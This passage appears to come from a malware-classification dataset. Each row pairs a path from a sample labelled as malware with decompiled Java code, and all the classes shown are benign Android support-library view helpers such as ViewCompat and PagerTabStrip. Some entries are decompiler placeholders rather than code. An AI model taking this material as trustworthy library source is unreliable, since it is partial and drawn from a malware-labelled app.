"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MenuItemCompatIcs.code","class MenuItemCompatIcs { interface SupportActionExpandProxy {     boolean onMenuItemActionCollapse(    MenuItem menuItem);     boolean onMenuItemActionExpand(    MenuItem menuItem);   }   MenuItemCompatIcs(){   }   public static boolean expandActionView(  MenuItem item){     return item.expandActionView();   }   public static boolean collapseActionView(  MenuItem item){     return item.collapseActionView();   }   public static boolean isActionViewExpanded(  MenuItem item){     return item.isActionViewExpanded();   }   public static MenuItem setOnActionExpandListener(  MenuItem item,  SupportActionExpandProxy listener){     return item.setOnActionExpandListener(new OnActionExpandListenerWrapper(listener));   } static class OnActionExpandListenerWrapper implements MenuItem.OnActionExpandListener {     private SupportActionExpandProxy mWrapped;     public OnActionExpandListenerWrapper(    SupportActionExpandProxy wrapped){       this.mWrapped=wrapped;     }     @Override public boolean onMenuItemActionExpand(    MenuItem item){       return this.mWrapped.onMenuItemActionExpand(item);     }     @Override public boolean onMenuItemActionCollapse(    MenuItem item){       return this.mWrapped.onMenuItemActionCollapse(item);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MenuVersionImpl.code","interface MenuVersionImpl {   boolean collapseActionView(  MenuItem menuItem);   boolean expandActionView(  MenuItem menuItem);   View getActionView(  MenuItem menuItem);   boolean isActionViewExpanded(  MenuItem menuItem);   MenuItem setActionView(  MenuItem menuItem,  int i);   MenuItem setActionView(  MenuItem menuItem,  View view);   MenuItem setOnActionExpandListener(  MenuItem menuItem,  OnActionExpandListener onActionExpandListener);   void setShowAsAction(  MenuItem menuItem,  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MotionEventCompat.code","public class MotionEventCompat {   public static final int ACTION_HOVER_ENTER=9;   public static final int ACTION_HOVER_EXIT=10;   public static final int ACTION_HOVER_MOVE=7;   public static final int ACTION_MASK=255;   public static final int ACTION_POINTER_DOWN=5;   public static final int ACTION_POINTER_INDEX_MASK=65280;   public static final int ACTION_POINTER_INDEX_SHIFT=8;   public static final int ACTION_POINTER_UP=6;   public static final int ACTION_SCROLL=8;   static final MotionEventVersionImpl IMPL; interface MotionEventVersionImpl {     int findPointerIndex(    MotionEvent motionEvent,    int i);     int getPointerCount(    MotionEvent motionEvent);     int getPointerId(    MotionEvent motionEvent,    int i);     float getX(    MotionEvent motionEvent,    int i);     float getY(    MotionEvent motionEvent,    int i);   } static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {     BaseMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return pointerId == 0 ? 0 : -1;     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return 0;       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getX();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getY();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public int getPointerCount(    MotionEvent event){       return 1;     }   } static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {     EclairMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return MotionEventCompatEclair.findPointerIndex(event,pointerId);     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getPointerId(event,pointerIndex);     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getX(event,pointerIndex);     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getY(event,pointerIndex);     }     @Override public int getPointerCount(    MotionEvent event){       return MotionEventCompatEclair.getPointerCount(event);     }   } static {     if (Build.VERSION.SDK_INT >= 5) {       IMPL=new EclairMotionEventVersionImpl();     }  else {       IMPL=new BaseMotionEventVersionImpl();     }   }   public static int getActionMasked(  MotionEvent event){     return event.getAction() & ACTION_MASK;   }   public static int getActionIndex(  MotionEvent event){     return (event.getAction() & ACTION_POINTER_INDEX_MASK) >> 8;   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return IMPL.findPointerIndex(event,pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return IMPL.getPointerId(event,pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return IMPL.getX(event,pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return IMPL.getY(event,pointerIndex);   }   public static int getPointerCount(  MotionEvent event){     return IMPL.getPointerCount(event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MotionEventCompatEclair.code","class MotionEventCompatEclair {   MotionEventCompatEclair(){   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return event.findPointerIndex(pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return event.getPointerId(pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return event.getX(pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return event.getY(pointerIndex);   }   public static int getPointerCount(  MotionEvent event){     return event.getPointerCount();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MotionEventVersionImpl.code","interface MotionEventVersionImpl {   int findPointerIndex(  MotionEvent motionEvent,  int i);   int getPointerCount(  MotionEvent motionEvent);   int getPointerId(  MotionEvent motionEvent,  int i);   float getX(  MotionEvent motionEvent,  int i);   float getY(  MotionEvent motionEvent,  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MyAccessibilityDelegate.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4b8b6dcc"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\OnActionExpandListener.code","public interface OnActionExpandListener {   boolean onMenuItemActionCollapse(  MenuItem menuItem);   boolean onMenuItemActionExpand(  MenuItem menuItem); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\OnActionExpandListenerWrapper.code","static class OnActionExpandListenerWrapper implements MenuItem.OnActionExpandListener {   private SupportActionExpandProxy mWrapped;   public OnActionExpandListenerWrapper(  SupportActionExpandProxy wrapped){     this.mWrapped=wrapped;   }   @Override public boolean onMenuItemActionExpand(  MenuItem item){     return this.mWrapped.onMenuItemActionExpand(item);   }   @Override public boolean onMenuItemActionCollapse(  MenuItem item){     return this.mWrapped.onMenuItemActionCollapse(item);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\OnAdapterChangeListener.code","public interface OnAdapterChangeListener {   void onAdapterChanged(  PagerAdapter pagerAdapter,  PagerAdapter pagerAdapter2); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\OnPageChangeListener.code","public interface OnPageChangeListener {   void onPageScrollStateChanged(  int i);   void onPageScrolled(  int i,  float f,  int i2);   void onPageSelected(  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PageListener.code","public class PageListener extends DataSetObserver implements ViewPager.OnPageChangeListener, ViewPager.OnAdapterChangeListener {   private int mScrollState;   private PageListener(){   }   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){     if (positionOffset > 0.5f) {       position++;     }     PagerTitleStrip.this.updateTextPositions(position,positionOffset,false);   }   @Override public void onPageSelected(  int position){     if (this.mScrollState == 0) {       PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());       float offset=PagerTitleStrip.this.mLastKnownPositionOffset >= 0.0f ? PagerTitleStrip.this.mLastKnownPositionOffset : 0.0f;       PagerTitleStrip.this.updateTextPositions(PagerTitleStrip.this.mPager.getCurrentItem(),offset,true);     }   }   @Override public void onPageScrollStateChanged(  int state){     this.mScrollState=state;   }   @Override public void onAdapterChanged(  PagerAdapter oldAdapter,  PagerAdapter newAdapter){     PagerTitleStrip.this.updateAdapter(oldAdapter,newAdapter);   }   @Override public void onChanged(){     PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());     float offset=PagerTitleStrip.this.mLastKnownPositionOffset >= 0.0f ? PagerTitleStrip.this.mLastKnownPositionOffset : 0.0f;     PagerTitleStrip.this.updateTextPositions(PagerTitleStrip.this.mPager.getCurrentItem(),offset,true);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PagerAdapter.code","public abstract class PagerAdapter {   public static final int POSITION_NONE=-2;   public static final int POSITION_UNCHANGED=-1;   private DataSetObservable mObservable=new DataSetObservable();   public abstract int getCount();   public abstract boolean isViewFromObject(  View view,  Object obj);   public void startUpdate(  ViewGroup container){     startUpdate((View)container);   }   public Object instantiateItem(  ViewGroup container,  int position){     return instantiateItem((View)container,position);   }   public void destroyItem(  ViewGroup container,  int position,  Object object){     destroyItem((View)container,position,object);   }   public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     setPrimaryItem((View)container,position,object);   }   public void finishUpdate(  ViewGroup container){     finishUpdate((View)container);   }   public void startUpdate(  View container){   }   public Object instantiateItem(  View container,  int position){     throw new UnsupportedOperationException(""Required method instantiateItem was not overridden"");   }   public void destroyItem(  View container,  int position,  Object object){     throw new UnsupportedOperationException(""Required method destroyItem was not overridden"");   }   public void setPrimaryItem(  View container,  int position,  Object object){   }   public void finishUpdate(  View container){   }   public Parcelable saveState(){     return null;   }   public void restoreState(  Parcelable state,  ClassLoader loader){   }   public int getItemPosition(  Object object){     return -1;   }   public void notifyDataSetChanged(){     this.mObservable.notifyChanged();   }   public void registerDataSetObserver(  DataSetObserver observer){     this.mObservable.registerObserver(observer);   }   public void unregisterDataSetObserver(  DataSetObserver observer){     this.mObservable.unregisterObserver(observer);   }   public CharSequence getPageTitle(  int position){     return null;   }   public float getPageWidth(  int position){     return 1.0f;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PagerObserver.code","private class PagerObserver extends DataSetObserver {   private PagerObserver(){   }   @Override public void onChanged(){     ViewPager.this.dataSetChanged();   }   @Override public void onInvalidated(){     ViewPager.this.dataSetChanged();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PagerTabStrip.code","public class PagerTabStrip extends PagerTitleStrip {   private static final int FULL_UNDERLINE_HEIGHT=1;   private static final int INDICATOR_HEIGHT=3;   private static final int MIN_PADDING_BOTTOM=6;   private static final int MIN_STRIP_HEIGHT=32;   private static final int MIN_TEXT_SPACING=64;   private static final int TAB_PADDING=16;   private static final int TAB_SPACING=32;   private static final String TAG=""PagerTabStrip"";   private boolean mDrawFullUnderline;   private boolean mDrawFullUnderlineSet;   private int mFullUnderlineHeight;   private boolean mIgnoreTap;   private int mIndicatorColor;   private int mIndicatorHeight;   private float mInitialMotionX;   private float mInitialMotionY;   private int mMinPaddingBottom;   private int mMinStripHeight;   private int mMinTextSpacing;   private int mTabAlpha;   private int mTabPadding;   private final Paint mTabPaint;   private final Rect mTempRect;   private int mTouchSlop;   public PagerTabStrip(  Context context){     this(context,null);   }   public PagerTabStrip(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mTabPaint=new Paint();     this.mTempRect=new Rect();     this.mTabAlpha=MotionEventCompat.ACTION_MASK;     this.mDrawFullUnderline=false;     this.mDrawFullUnderlineSet=false;     this.mIndicatorColor=this.mTextColor;     this.mTabPaint.setColor(this.mIndicatorColor);     float density=context.getResources().getDisplayMetrics().density;     this.mIndicatorHeight=(int)((3.0f * density) + 0.5f);     this.mMinPaddingBottom=(int)((6.0f * density) + 0.5f);     this.mMinTextSpacing=(int)(64.0f * density);     this.mTabPadding=(int)((16.0f * density) + 0.5f);     this.mFullUnderlineHeight=(int)((1.0f * density) + 0.5f);     this.mMinStripHeight=(int)((32.0f * density) + 0.5f);     this.mTouchSlop=ViewConfiguration.get(context).getScaledTouchSlop();     setPadding(getPaddingLeft(),getPaddingTop(),getPaddingRight(),getPaddingBottom());     setTextSpacing(getTextSpacing());     setWillNotDraw(false);     this.mPrevText.setFocusable(true);     this.mPrevText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() - 1);       }     } );     this.mNextText.setFocusable(true);     this.mNextText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() + 1);       }     } );     if (getBackground() == null) {       this.mDrawFullUnderline=true;     }   }   public void setTabIndicatorColor(  int color){     this.mIndicatorColor=color;     this.mTabPaint.setColor(this.mIndicatorColor);     invalidate();   }   public void setTabIndicatorColorResource(  int resId){     setTabIndicatorColor(getContext().getResources().getColor(resId));   }   public int getTabIndicatorColor(){     return this.mIndicatorColor;   }   @Override public void setPadding(  int left,  int top,  int right,  int bottom){     if (bottom < this.mMinPaddingBottom) {       bottom=this.mMinPaddingBottom;     }     super.setPadding(left,top,right,bottom);   }   @Override public void setTextSpacing(  int textSpacing){     if (textSpacing < this.mMinTextSpacing) {       textSpacing=this.mMinTextSpacing;     }     super.setTextSpacing(textSpacing);   }   @Override public void setBackgroundDrawable(  Drawable d){     super.setBackgroundDrawable(d);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=d == null;     }   }   @Override public void setBackgroundColor(  int color){     super.setBackgroundColor(color);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=((-16777216) & color) == 0;     }   }   @Override public void setBackgroundResource(  int resId){     super.setBackgroundResource(resId);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=resId == 0;     }   }   public void setDrawFullUnderline(  boolean drawFull){     this.mDrawFullUnderline=drawFull;     this.mDrawFullUnderlineSet=true;     invalidate();   }   public boolean getDrawFullUnderline(){     return this.mDrawFullUnderline;   }   @Override public int getMinHeight(){     return Math.max(super.getMinHeight(),this.mMinStripHeight);   }   @Override public boolean onTouchEvent(  MotionEvent ev){     int action=ev.getAction();     if (action != 0 && this.mIgnoreTap) {       return false;     }     float x=ev.getX();     float y=ev.getY(); switch (action) { case 0:       this.mInitialMotionX=x;     this.mInitialMotionY=y;   this.mIgnoreTap=false; break; case 1: if (x >= this.mCurrText.getLeft() - this.mTabPadding) { if (x > this.mCurrText.getRight() + this.mTabPadding) {   this.mPager.setCurrentItem(this.mPager.getCurrentItem() + 1);   break; } }  else { this.mPager.setCurrentItem(this.mPager.getCurrentItem() - 1); break; } break; case 2: if (Math.abs(x - this.mInitialMotionX) > this.mTouchSlop || Math.abs(y - this.mInitialMotionY) > this.mTouchSlop) { this.mIgnoreTap=true; break; } break; } return true; } @Override protected void onDraw(Canvas canvas){ super.onDraw(canvas); int height=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=height - this.mIndicatorHeight; this.mTabPaint.setColor((this.mTabAlpha << 24) | (this.mIndicatorColor & ViewCompat.MEASURED_SIZE_MASK)); canvas.drawRect(left,top,right,height,this.mTabPaint); if (this.mDrawFullUnderline) { this.mTabPaint.setColor((-16777216) | (this.mIndicatorColor & ViewCompat.MEASURED_SIZE_MASK)); canvas.drawRect(getPaddingLeft(),height - this.mFullUnderlineHeight,getWidth() - getPaddingRight(),height,this.mTabPaint); } } @Override public void updateTextPositions(int position,float positionOffset,boolean force){ Rect r=this.mTempRect; int bottom=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=bottom - this.mIndicatorHeight; r.set(left,top,right,bottom); super.updateTextPositions(position,positionOffset,force); this.mTabAlpha=(int)(Math.abs(positionOffset - 0.5f) * 2.0f * 255.0f); int left2=this.mCurrText.getLeft() - this.mTabPadding; int right2=this.mCurrText.getRight() + this.mTabPadding; r.union(left2,top,right2,bottom); invalidate(r); } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PagerTitleStrip.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5433b2f8"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PagerTitleStripIcs.code","class PagerTitleStripIcs {   PagerTitleStripIcs(){   }   public static void setSingleLineAllCaps(  TextView text){     text.setTransformationMethod(new SingleLineAllCapsTransform(text.getContext()));   } private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {     private static final String TAG=""SingleLineAllCapsTransform"";     private Locale mLocale;     public SingleLineAllCapsTransform(    Context context){       this.mLocale=context.getResources().getConfiguration().locale;     }     @Override public CharSequence getTransformation(    CharSequence source,    View view){       CharSequence source2=super.getTransformation(source,view);       if (source2 != null) {         return source2.toString().toUpperCase(this.mLocale);       }       return null;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PagerTitleStripImpl.code","public interface PagerTitleStripImpl {   void setSingleLineAllCaps(  TextView textView); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PagerTitleStripImplBase.code","static class PagerTitleStripImplBase implements PagerTitleStripImpl {   PagerTitleStripImplBase(){   }   @Override public void setSingleLineAllCaps(  TextView text){     text.setSingleLine();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PagerTitleStripImplIcs.code","static class PagerTitleStripImplIcs implements PagerTitleStripImpl {   PagerTitleStripImplIcs(){   }   @Override public void setSingleLineAllCaps(  TextView text){     PagerTitleStripIcs.setSingleLineAllCaps(text);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\PageTransformer.code","public interface PageTransformer {   void transformPage(  View view,  float f); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=ParcelableCompat.newCreator(new ParcelableCompatCreatorCallbacks<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in,    ClassLoader loader){       return new SavedState(in,loader);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } );   Parcelable adapterState;   ClassLoader loader;   int position;   public SavedState(  Parcelable superState){     super(superState);   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeInt(this.position);     out.writeParcelable(this.adapterState,flags);   }   public String toString(){     return ""FragmentPager.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" position=""+ this.position+ ""}"";   }   SavedState(  Parcel in,  ClassLoader loader){     super(in);     loader=loader == null ? getClass().getClassLoader() : loader;     this.position=in.readInt();     this.adapterState=in.readParcelable(loader);     this.loader=loader;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ScaleGestureDetectorCompat.code","public class ScaleGestureDetectorCompat {   static final ScaleGestureDetectorImpl IMPL; interface ScaleGestureDetectorImpl {     boolean isQuickScaleEnabled(    Object obj);     void setQuickScaleEnabled(    Object obj,    boolean z);   } private static class BaseScaleGestureDetectorImpl implements ScaleGestureDetectorImpl {     private BaseScaleGestureDetectorImpl(){     }     @Override public void setQuickScaleEnabled(    Object o,    boolean enabled){     }     @Override public boolean isQuickScaleEnabled(    Object o){       return false;     }   } private static class ScaleGestureDetectorCompatKitKatImpl implements ScaleGestureDetectorImpl {     private ScaleGestureDetectorCompatKitKatImpl(){     }     @Override public void setQuickScaleEnabled(    Object o,    boolean enabled){       ScaleGestureDetectorCompatKitKat.setQuickScaleEnabled(o,enabled);     }     @Override public boolean isQuickScaleEnabled(    Object o){       return ScaleGestureDetectorCompatKitKat.isQuickScaleEnabled(o);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new ScaleGestureDetectorCompatKitKatImpl();     }  else {       IMPL=new BaseScaleGestureDetectorImpl();     }   }   private ScaleGestureDetectorCompat(){   }   public static void setQuickScaleEnabled(  Object scaleGestureDetector,  boolean enabled){     IMPL.setQuickScaleEnabled(scaleGestureDetector,enabled);   }   public static boolean isQuickScaleEnabled(  Object scaleGestureDetector){     return IMPL.isQuickScaleEnabled(scaleGestureDetector);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ScaleGestureDetectorCompatKitKat.code","class ScaleGestureDetectorCompatKitKat {   private ScaleGestureDetectorCompatKitKat(){   }   public static void setQuickScaleEnabled(  Object scaleGestureDetector,  boolean enabled){     ((ScaleGestureDetector)scaleGestureDetector).setQuickScaleEnabled(enabled);   }   public static boolean isQuickScaleEnabled(  Object scaleGestureDetector){     return ((ScaleGestureDetector)scaleGestureDetector).isQuickScaleEnabled();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ScaleGestureDetectorCompatKitKatImpl.code","private static class ScaleGestureDetectorCompatKitKatImpl implements ScaleGestureDetectorImpl {   private ScaleGestureDetectorCompatKitKatImpl(){   }   @Override public void setQuickScaleEnabled(  Object o,  boolean enabled){     ScaleGestureDetectorCompatKitKat.setQuickScaleEnabled(o,enabled);   }   @Override public boolean isQuickScaleEnabled(  Object o){     return ScaleGestureDetectorCompatKitKat.isQuickScaleEnabled(o);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ScaleGestureDetectorImpl.code","interface ScaleGestureDetectorImpl {   boolean isQuickScaleEnabled(  Object obj);   void setQuickScaleEnabled(  Object obj,  boolean z); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\SimpleOnPageChangeListener.code","public static class SimpleOnPageChangeListener implements OnPageChangeListener {   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){   }   @Override public void onPageSelected(  int position){   }   @Override public void onPageScrollStateChanged(  int state){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\SingleLineAllCapsTransform.code","private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {   private static final String TAG=""SingleLineAllCapsTransform"";   private Locale mLocale;   public SingleLineAllCapsTransform(  Context context){     this.mLocale=context.getResources().getConfiguration().locale;   }   @Override public CharSequence getTransformation(  CharSequence source,  View view){     CharSequence source2=super.getTransformation(source,view);     if (source2 != null) {       return source2.toString().toUpperCase(this.mLocale);     }     return null;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\SubUiVisibilityListener.code","public interface SubUiVisibilityListener {   void onSubUiVisibilityChanged(  boolean z); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\SupportActionExpandProxy.code","interface SupportActionExpandProxy {   boolean onMenuItemActionCollapse(  MenuItem menuItem);   boolean onMenuItemActionExpand(  MenuItem menuItem); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\VelocityTrackerCompat.code","public class VelocityTrackerCompat {   static final VelocityTrackerVersionImpl IMPL; interface VelocityTrackerVersionImpl {     float getXVelocity(    VelocityTracker velocityTracker,    int i);     float getYVelocity(    VelocityTracker velocityTracker,    int i);   } static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     BaseVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getXVelocity();     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getYVelocity();     }   } static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     HoneycombVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombVelocityTrackerVersionImpl();     }  else {       IMPL=new BaseVelocityTrackerVersionImpl();     }   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getXVelocity(tracker,pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\VelocityTrackerCompatHoneycomb.code","class VelocityTrackerCompatHoneycomb {   VelocityTrackerCompatHoneycomb(){   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity(pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity(pointerId);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\VelocityTrackerVersionImpl.code","interface VelocityTrackerVersionImpl {   float getXVelocity(  VelocityTracker velocityTracker,  int i);   float getYVelocity(  VelocityTracker velocityTracker,  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewCompat.code","public class ViewCompat {   public static final int ACCESSIBILITY_LIVE_REGION_ASSERTIVE=2;   public static final int ACCESSIBILITY_LIVE_REGION_NONE=0;   public static final int ACCESSIBILITY_LIVE_REGION_POLITE=1;   private static final long FAKE_FRAME_TIME=10;   static final ViewCompatImpl IMPL;   public static final int IMPORTANT_FOR_ACCESSIBILITY_AUTO=0;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO=2;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS=4;   public static final int IMPORTANT_FOR_ACCESSIBILITY_YES=1;   public static final int LAYER_TYPE_HARDWARE=2;   public static final int LAYER_TYPE_NONE=0;   public static final int LAYER_TYPE_SOFTWARE=1;   public static final int LAYOUT_DIRECTION_INHERIT=2;   public static final int LAYOUT_DIRECTION_LOCALE=3;   public static final int LAYOUT_DIRECTION_LTR=0;   public static final int LAYOUT_DIRECTION_RTL=1;   public static final int MEASURED_HEIGHT_STATE_SHIFT=16;   public static final int MEASURED_SIZE_MASK=16777215;   public static final int MEASURED_STATE_MASK=-16777216;   public static final int MEASURED_STATE_TOO_SMALL=16777216;   public static final int OVER_SCROLL_ALWAYS=0;   public static final int OVER_SCROLL_IF_CONTENT_SCROLLS=1;   public static final int OVER_SCROLL_NEVER=2; interface ViewCompatImpl {     boolean canScrollHorizontally(    View view,    int i);     boolean canScrollVertically(    View view,    int i);     int getAccessibilityLiveRegion(    View view);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view);     float getAlpha(    View view);     int getImportantForAccessibility(    View view);     int getLabelFor(    View view);     int getLayerType(    View view);     int getLayoutDirection(    View view);     int getMeasuredHeightAndState(    View view);     int getMeasuredState(    View view);     int getMeasuredWidthAndState(    View view);     int getOverScrollMode(    View view);     ViewParent getParentForAccessibility(    View view);     boolean hasTransientState(    View view);     boolean isOpaque(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void postInvalidateOnAnimation(    View view);     void postInvalidateOnAnimation(    View view,    int i,    int i2,    int i3,    int i4);     void postOnAnimation(    View view,    Runnable runnable);     void postOnAnimationDelayed(    View view,    Runnable runnable,    long j);     int resolveSizeAndState(    int i,    int i2,    int i3);     void setAccessibilityDelegate(    View view,    